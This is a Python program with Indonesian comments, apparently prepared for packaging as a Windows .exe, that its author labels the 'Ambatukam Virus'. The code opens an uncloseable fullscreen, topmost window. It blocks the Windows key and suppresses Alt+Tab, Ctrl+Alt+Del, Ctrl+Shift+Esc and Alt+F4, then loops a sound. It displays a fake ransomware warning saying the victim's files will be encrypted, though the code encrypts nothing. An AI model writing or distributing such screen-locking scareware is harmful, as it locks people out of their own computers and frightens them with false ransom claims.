import pygame
import tkinter as tk
import keyboard
import os
import sys  # Tambahan: Diperlukan untuk mendeteksi folder internal PyInstaller
from PIL import Image, ImageTk

# Fungsi untuk mengatasi path eror saat dikonversi menjadi .exe
def resource_path(relative_path):
    """ Mendapatkan absolute path ke resource, berfungsi saat dev dan setelah di-build .exe """
    try:
        # PyInstaller membuat folder temporary dan menyimpan path-nya di _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Ambatukam Virus

window = tk.Tk()

window.configure(bg="black")
window.title("Ambatukam Virus")
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

canvas = tk.Canvas(window, width=screen_width, height=screen_height, highlightthickness=0)
canvas.pack(fill="both", expand=True)

# Force can't shortcut
window.protocol("WM_DELETE_WINDOW", lambda: None)
window.focus_force()
window.bind("<F11>", lambda event: "break")
window.bind("<Escape>", lambda event: "break")

keyboard.block_key("windows")
keyboard.add_hotkey("alt+tab", lambda: None, suppress=True)
keyboard.add_hotkey("ctrl+alt+del", lambda: None, suppress=True)
keyboard.add_hotkey("ctrl+shift+esc", lambda: None, suppress=True)
keyboard.add_hotkey("alt+f4", lambda: None, suppress=True)
keyboard.add_hotkey("win+tab", lambda: None, suppress=True)
keyboard.add_hotkey("ctrl+esc", lambda: None, suppress=True)


# Pygame settings

pygame.mixer.init()

# PERBAIKAN PATH: Dibungkus dengan resource_path() agar tidak error
audio_path = resource_path(os.path.join("sound", "sound.mp3"))
image_path = resource_path(os.path.join("images", "image.png"))

# load and display images
try:
    img_open = Image.open(image_path)
    img_resized = img_open.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
    img_tkinter = ImageTk.PhotoImage(img_resized)

    # PERBAIKAN: Ubah 'img=' menjadi 'image='
    canvas.create_image(0, 0, image=img_tkinter, anchor="nw")

    canvas.image = img_tkinter
except Exception as e:
    print(f"Gagal memuat gambar: {e}")
    canvas.configure(bg="black")

# load and play sound

try:
    pygame.mixer.music.load(audio_path)
    pygame.mixer.music.play(-1)
except Exception as e:
    print(f"Gagal memutar audio. Pastikan file berada di {audio_path}. Error: {e}")


# Force screen

window.attributes("-fullscreen", True)
window.attributes("-topmost", True)

# Main program

canvas.create_text(screen_width // 2, 150, text="Ambatukam Virus", font=("Arial", 50, "bold"), fill="red")
canvas.create_text(screen_width // 2, 300, text="Your computer has been infected with the Ambatukam Virus.\nPlease don't turn off your computer. Your files will be encrypted \nAmbatukam!!!", font=("Arial", 30), fill="white", justify="center")

window.mainloop()
